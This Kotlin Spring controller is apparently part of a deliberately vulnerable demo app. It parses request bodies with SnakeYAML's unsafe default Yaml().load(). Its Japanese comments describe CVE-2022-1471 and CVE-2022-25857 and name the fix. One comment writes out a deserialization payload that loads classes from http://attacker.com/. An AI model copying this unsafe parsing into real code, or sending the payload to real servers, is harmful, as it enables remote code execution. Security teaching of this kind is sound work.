package com.example.vulnerable.controller

import org.springframework.http.ResponseEntity
import org.springframework.web.bind.annotation.*
import org.yaml.snakeyaml.Yaml

@RestController
@RequestMapping("/api/yaml")
class YamlController {

    // CVE-2022-1471 (SnakeYAML 1.30, CVSS 9.8):
    // Yaml().load() はデフォルトで !! タグによる任意クラスのインスタンス化を許可する。
    // 攻撃例 (Content-Type: text/plain):
    //   !!javax.script.ScriptEngineManager
    //     [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]
    // → 攻撃者サーバーからクラスをロードして任意コード実行。
    //
    // CVE-2022-25857 (SnakeYAML 1.30, CVSS 7.5):
    // 細工された YAML で無限ループが発生し DoS になる。
    //
    // 修正: snakeyaml 2.0 以上にアップグレード、または
    //       new Yaml(new SafeConstructor()) を使用する。
    @PostMapping("/parse")
    fun parseYaml(@RequestBody yamlContent: String): ResponseEntity<Any> {
        return try {
            val yaml = Yaml()
            val result = yaml.load<Any>(yamlContent)
            ResponseEntity.ok(mapOf("parsed" to result?.toString(), "type" to result?.javaClass?.name))
        } catch (e: Exception) {
            ResponseEntity.badRequest().body(mapOf("error" to e.message))
        }
    }
}
